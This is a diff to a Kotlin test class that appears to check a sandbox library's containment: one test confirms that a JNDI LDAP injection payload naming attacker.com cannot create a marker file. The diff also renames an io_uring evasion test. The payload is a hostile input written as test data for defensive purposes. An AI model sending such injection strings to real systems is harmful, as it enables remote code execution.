@@ -26,20 +26,19 @@ class ProtectionDemonstrationTest {
         if (!osName.equals("Linux", ignoreCase = true)) return
         if (!io.mazewall.Platform.isSupported()) return
 
-        val marker = File("/tmp/pwned_safe")
-        marker.delete()
+        DemoFixture.create("protected-shell").use { fixture ->
+            val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,${fixture.marker.absolutePath}}"
 
-        val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,/tmp/pwned_safe}"
+            val ex = assertFailsWith<ContainmentViolationException> { SafeRunner.run(payload) }
 
-        val ex = assertFailsWith<ContainmentViolationException> { SafeRunner.run(payload) }
+            assertEquals(
+                ContainmentViolationEvidence.INFERRED_PERMISSION_FAILURE,
+                ContainmentViolationDetector.diagnose(ex)?.evidence,
+                "Expected an inferred permission failure, got: ${ex.cause}",
+            )
 
-        assertEquals(
-            ContainmentViolationEvidence.INFERRED_PERMISSION_FAILURE,
-            ContainmentViolationDetector.diagnose(ex)?.evidence,
-            "Expected an inferred permission failure, got: ${ex.cause}",
-        )
-
-        assertFalse(marker.exists(), "Exploit marker should NOT exist")
+            assertFalse(fixture.marker.exists(), "Exploit marker should NOT exist")
+        }
     }
 
     @Test
@@ -169,7 +168,7 @@ class ProtectionDemonstrationTest {
     }
 
     @Test
-    fun `Attack 5 - io_uring Async Evasion Protected`() {
+    fun `Attack 5 - synchronous native open protected`() {
         val osName = System.getProperty("os.name")
         if (!osName.equals("Linux", ignoreCase = true)) return
         if (!io.mazewall.Platform.isSupported()) return
